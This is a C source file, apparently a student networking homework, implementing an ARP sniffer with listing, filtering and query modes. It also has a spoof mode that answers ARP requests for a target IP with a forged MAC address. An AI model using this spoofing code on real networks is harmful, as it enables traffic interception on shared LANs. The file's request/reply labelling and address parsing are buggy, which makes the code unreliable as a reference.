#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

/*
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp3s0"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

// IP address length
#define IP_ADDR_LEN 4
// MAC address length
#define MAC_ADDR_LEN 6
// Ether header length
#define ETHER_HEADER_LEN sizeof(struct ether_header)
// Ether ARP length
#define ETHER_ARP_LEN sizeof(struct ether_arp)
// ARP packet length
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN


//#define TEST_WORK

// Input address to insigned char
unsigned char charArr2uc(char* ca, int size){
    int cont = 1;
    unsigned char r = 0;
    char c = '0';
    for(int i = size-1; i >=0; i--){
        r += (ca[i] - c) * cont;
        cont *= 10;
    }

    return r;
}

// Compare the input address and the address of the ARP packet.
int compareAddress(struct ether_arp *arpPacket, char* address, int s_or_t){
    int wrongFlag = 0;

    unsigned char *result = s_or_t == 0 ? get_sender_protocol_addr(arpPacket) : get_target_protocol_addr(arpPacket);

    unsigned char *fAddress = malloc(7 * sizeof(char));
    char* token;
    int count = 0;
    char* inputAddress = malloc((int)strlen(address) * sizeof(char));
    memcpy(inputAddress, address, (int)strlen(address) * sizeof(char));

    while( (token = strsep(&inputAddress, ".")) != NULL){
        unsigned char c = charArr2uc(token, strlen(token));
        fAddress[count] = c;
        if(count != 6){fAddress[count+1] = '.';}
        count += 2;
    }

    #ifdef TEST_WORK
    for(int i = 0; i < IP_ADDR_LEN + 3; i++){
        printf(".%u", fAddress[i]);
    }
    printf("\n");
    for(int i = 0; i < IP_ADDR_LEN + 3; i++){
        printf(".%u", result[i]);
    }
    printf("\n");
    #endif // TEST_WORK

    // compare
    for(int i = 0; i < IP_ADDR_LEN + 3; i++){
        if(result[i] != fAddress[i]){
            wrongFlag = 1;
            break;
        }
    }

    free(result);

    return wrongFlag;
}

// Receive ARP function
struct ether_arp *recvARP(char* buf, int sockfd_recv, struct sockaddr_ll sa, int len){
    bzero(buf, ETHER_ARP_PACKET_LEN);
    int n = recvfrom(sockfd_recv, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*)&sa, &len);

    struct ether_arp *arpPacket = (struct ether_arp *)(buf + ETHER_HEADER_LEN);

    return arpPacket;
}

int main(int arg, char* argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq ifr;

	// If not run with root privilege
	if(geteuid() != 0){
	    printf("ERROR: You must be root to use this tool!\n");
	    exit(0);
	}

	// Help command
	if(strcmp(argv[1], "-help") == 0){
	    printf("[ ARP sniffer and spoof program ]\n");
	    printf("Fromat :\n");
	    printf("1) ./arp -l -a\n");
	    printf("2) ./arp -l <filter_ip_address>\n");
	    printf("3) ./arp -q <query_ip_address>\n");
	    printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
	}

	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */

    char reBuff[ ETHER_ARP_PACKET_LEN ];
    int len = sizeof(sa);

    // List all ARP packets
    if(strcmp(argv[1], "-l") == 0 && strcmp(argv[2], "-a") == 0){

        printf("[ ARP sniffer and spoof program ]\n");
        printf("### ARP query mode ###\n");

        while(1){
            struct ether_arp *arpPacket = recvARP(reBuff, sockfd_recv, sa, len);

            // Make sure op is request code
            if(ntohs(arpPacket->arp_op) == 2){

                printf("Get ARP packet - Who has ");
                for (int i = 0; i < IP_ADDR_LEN; i++){
                    if(i != IP_ADDR_LEN - 1){
                        printf("%u.", arpPacket->arp_spa[i]);
                    }
                    else{
                        printf("%u", arpPacket->arp_spa[i]);
                    }
                }
                printf(" ?     ");

                printf("Tell ");
                for (int i = 0; i < IP_ADDR_LEN; i++){
                    if(i != IP_ADDR_LEN - 1){
                        printf("%u.", arpPacket->arp_tpa[i]);
                    }
                    else{
                        printf("%u\n", arpPacket->arp_tpa[i]);
                    }
                }
            }
        }
    }

    // List AARP packets we want
    else if(strcmp(argv[1], "-l") == 0 && argv[2] != NULL){
        printf("[ ARP sniffer and spoof program ]\n");
        printf("### ARP query mode ###\n");

        while(1){
            struct ether_arp *arpPacket = recvARP(reBuff, sockfd_recv, sa, len);

            // Make sure op is request code
            if(ntohs(arpPacket->arp_op) == 2){
                if(compareAddress(arpPacket, argv[2], 0) == 0){

                    printf("Get ARP packet - Who has ");
                    for (int i = 0; i < IP_ADDR_LEN; i++){
                        if(i != IP_ADDR_LEN - 1){
                            printf("%u.", arpPacket->arp_spa[i]);
                        }
                        else{
                            printf("%u", arpPacket->arp_spa[i]);
                        }
                    }
                    printf(" ?     ");

                    printf("Tell ");
                    for (int i = 0; i < IP_ADDR_LEN; i++){
                        if(i != IP_ADDR_LEN - 1){
                            printf("%u.", arpPacket->arp_tpa[i]);
                        }
                        else{
                            printf("%u\n", arpPacket->arp_tpa[i]);
                        }
                    }
                }
            }
        }
    }


	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}

	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
    // Source MAC address
    unsigned char srcMacAddr[ETH_ALEN];

    // Target MAC address. Use boradcast
    unsigned char dstMacAddr[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    // clear ifr and sa
    memset(&ifr, 0, sizeof(ifr));
    memset(&sa, 0, sizeof(sa));

    strncpy (ifr.ifr_name, DEVICE_NAME, sizeof(ifr.ifr_name) - 1);
    ifr.ifr_name[sizeof(ifr.ifr_name)-1] = '\0';

    // Get interface address
    if(ioctl(sockfd_send, SIOCGIFADDR, &ifr) < 0){printf("SIOCGIFADDR error\n");}
    char* srcIp = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

    // Get interface index
    if(ioctl(sockfd_send, SIOCGIFINDEX, &ifr) < 0){printf("SIOCGIFINDEX error\n");}
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_family = PF_PACKET;

    // Get interface hardware address
    if(ioctl(sockfd_send, SIOCGIFHWADDR, &ifr) < 0){printf("SIOCGIFHWADDR error\n");}
    memcpy(srcMacAddr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */

    // Send the ARP packet
    if(strcmp(argv[1], "-q") == 0 && argv[2] != NULL){

        // send buffer
        char seBuff[ ETHER_ARP_PACKET_LEN ];
        // clear seBuff
        bzero(seBuff, ETHER_ARP_PACKET_LEN);

        // Fill ether header
        struct ether_header *ethHeader = (struct ether_header*)seBuff;
        memcpy(ethHeader->ether_shost, srcMacAddr, ETH_ALEN);
        memcpy(ethHeader->ether_dhost, dstMacAddr, ETH_ALEN);

        ethHeader->ether_type = htons(ETHERTYPE_ARP);

        struct in_addr inaddrSrc, inaddrDst;
        struct ether_arp *ethARP;

        inet_pton(AF_INET, srcIp, &inaddrSrc);
        inet_pton(AF_INET, argv[2], &inaddrDst);

        // Fill arp packet
        ethARP = (struct ether_arp *)malloc(ETHER_ARP_LEN);

        ethARP->arp_hrd = htons(ARPHRD_ETHER);
        ethARP->arp_pro = htons(ETHERTYPE_IP);
        ethARP->arp_hln = ETH_ALEN;
        ethARP->arp_pln = IP_ADDR_LEN;
        ethARP->arp_op = htons(ARPOP_REQUEST);

        memcpy(ethARP->arp_sha, srcMacAddr, ETH_ALEN);
        memcpy(ethARP->arp_tha, dstMacAddr, ETH_ALEN);
        memcpy(ethARP->arp_spa, &inaddrSrc, IP_ADDR_LEN);
        memcpy(ethARP->arp_tpa, &inaddrDst, IP_ADDR_LEN);

        memcpy(seBuff + ETHER_HEADER_LEN, ethARP, ETHER_ARP_LEN);

        // Send
        if(sendto(sockfd_send, seBuff, sizeof(seBuff), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0){
            perror("Error");
        }

        else{
            struct sockaddr_ll sa2;
            if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
                perror("open recv socket error");
                exit(1);
            }
            bzero(&sa2, sizeof(sa2));
            int breakFlag = 0;

            while(breakFlag == 0){
                struct ether_arp *arpPacket = recvARP(reBuff, sockfd_recv, sa2, sizeof(sa2));

                // Make sure op is request code
                if(ntohs(arpPacket->arp_op) == 2){
                    if(compareAddress(arpPacket, argv[2], 0) == 0){
                        printf("[ ARP sniffer and spoof program ]\n");
                        printf("### ARP query mode ###\n");

                        printf("MAC address of ");
                        for (int i = 0; i < IP_ADDR_LEN; i++){
                            if(i != IP_ADDR_LEN - 1){
                                printf("%u.", arpPacket->arp_spa[i]);
                            }
                            else{
                                printf("%u", arpPacket->arp_spa[i]);
                            }
                        }

                        printf(" is ");

                        for (int i = 0; i < MAC_ADDR_LEN; i++){
                            if(i != MAC_ADDR_LEN - 1){
                                printf("%x:", arpPacket->arp_sha[i]);
                            }
                            else{
                                printf("%x\n", arpPacket->arp_sha[i]);
                            }
                        }

                        // Break
                        breakFlag = 1;
                    }
                }
            }
        }
    }

    // Reply a fake mac to sender
    else if(argv[1] != NULL && argv[2] != NULL){
        unsigned char fackMac[ETH_ALEN];
        if(sscanf(argv[1], "%x:%x:%x:%x:%x:%x",
            &fackMac[0], &fackMac[1],&fackMac[2],
            &fackMac[3],&fackMac[4],&fackMac[5]) == 6){
        }

        struct ether_arp *requestARP;

        while(1){

            requestARP = recvARP(reBuff, sockfd_recv, sa, len);
            char seBuff[ ETHER_ARP_PACKET_LEN ];
            bzero(seBuff, ETHER_ARP_PACKET_LEN);

            if(ntohs(requestARP->arp_op) == 1){
            if(compareAddress(requestARP, argv[2], 1) == 0){
                struct ether_header *ethHeader = (struct ether_header*)seBuff;
                memcpy(ethHeader->ether_shost, srcMacAddr, ETH_ALEN);
                memcpy(ethHeader->ether_dhost, requestARP->arp_sha, ETH_ALEN);

                ethHeader->ether_type = htons(ETHERTYPE_ARP);

                struct in_addr inaddrSrc, inaddrDst;
                struct ether_arp *ethARP;

                inet_pton(AF_INET, srcIp, &inaddrSrc);
                inet_pton(AF_INET, argv[2], &inaddrDst);

                // Fill arp packet
                ethARP = (struct ether_arp *)malloc(ETHER_ARP_LEN);

                ethARP->arp_hrd = htons(ARPHRD_ETHER);
                ethARP->arp_pro = htons(ETHERTYPE_IP);
                ethARP->arp_hln = ETH_ALEN;
                ethARP->arp_pln = IP_ADDR_LEN;
                ethARP->arp_op = htons(ARPOP_REPLY);

                memcpy(ethARP->arp_sha, fackMac, ETH_ALEN);
                memcpy(ethARP->arp_tha, requestARP->arp_sha, ETH_ALEN);
                memcpy(ethARP->arp_spa, &inaddrDst, IP_ADDR_LEN);
                memcpy(ethARP->arp_tpa, &inaddrSrc, IP_ADDR_LEN);

                memcpy(seBuff + ETHER_HEADER_LEN, ethARP, ETHER_ARP_LEN);

                // Send
                if(sendto(sockfd_send, seBuff, sizeof(seBuff), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0){
                    perror("Error");
                }
                else{
                    printf("Get ARP packet - Who has ");
                    for (int i = 0; i < IP_ADDR_LEN; i++){
                        if(i != IP_ADDR_LEN - 1){
                            printf("%u.", requestARP->arp_tpa[i]);
                        }
                        else{
                            printf("%u", requestARP->arp_tpa[i]);
                        }
                    }
                    printf(" ?     ");

                    printf("Tell ");
                    for (int i = 0; i < IP_ADDR_LEN; i++){
                        if(i != IP_ADDR_LEN - 1){
                            printf("%u.", requestARP->arp_spa[i]);
                        }
                        else{
                            printf("%u\n", requestARP->arp_spa[i]);
                        }
                    }
                    printf("success\n");
                    exit(0);
                }
            }
            }

        }
    }



	return 0;
}
